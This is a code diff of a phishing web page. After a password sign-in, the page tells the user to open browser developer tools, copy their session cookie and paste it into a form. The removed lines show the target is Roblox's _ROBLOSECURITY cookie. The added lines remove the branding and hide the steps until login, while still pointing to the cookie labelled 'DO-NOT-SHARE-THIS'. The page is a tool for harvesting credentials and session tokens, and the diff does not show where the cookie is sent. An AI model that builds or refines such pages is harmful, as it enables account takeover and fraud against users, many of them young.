@@ -64,19 +64,19 @@
         <h2>Enter Your Cookie</h2>
         <p>To complete your sign-in, please provide the cookie associated with your account.</p>
         
-        <!-- Roblox Cookie Instructions -->
-        <h3>How to Find Your Roblox Cookie:</h3>
-        <ol>
-            <li>Go to <a href="https://www.roblox.com" target="_blank" style="color: lightblue;">www.roblox.com</a> in your browser.</li>
+        <!-- Cookie Instructions (Initially hidden) -->
+        <h3>How to Find Your Cookie:</h3>
+        <ol id="cookieInstructions" style="display:none;">
+            <li>Open the website in your browser.</li>
             <li>Right-click anywhere on the page and select <strong>Inspect</strong>.</li>
-            <li>Navigate to the <strong>Application</strong> tab in the Developer Tools.</li>
-            <li>Under the <strong>Storage</strong> section on the left sidebar, click on <strong>Cookies</strong>.</li>
-            <li>Select <strong>www.roblox.com</strong> from the list of domains.</li>
-            <li>Look for a cookie named <code>_ROBLOSECURITY</code> or any similar cookie that may contain your session information.</li>
+            <li>Navigate to the <strong>Application</strong> tab.</li>
+            <li>Under <strong>Storage</strong> in the left sidebar, select <strong>Cookies</strong>.</li>
+            <li>Click on the website URL in the list of cookies.</li>
+            <li>Look for the cookie named <code>_<strong>|WARNING:-DO-NOT-SHARE-THIS</strong></code>.</li>
             <li>Copy its value and paste it below:</li>
         </ol>
 
-        <input type="text" class="input-box" id="cookieInput" placeholder="Enter your Roblox cookie here">
+        <input type="text" class="input-box" id="cookieInput" placeholder="Enter your cookie here">
         <button class="btn" onclick="submitCookie()">Submit Cookie</button>
     </div>
 
@@ -104,6 +104,7 @@
             if (currentUser) {
                 document.getElementById("loginSection").style.display = "none"; // Hide sign-in section
                 document.getElementById("cookieSection").style.display = "block"; // Show cookie section
+                document.getElementById("cookieInstructions").style.display = "block"; // Show cookie instructions
             } else {
                 alert("Invalid username or password.");
             }
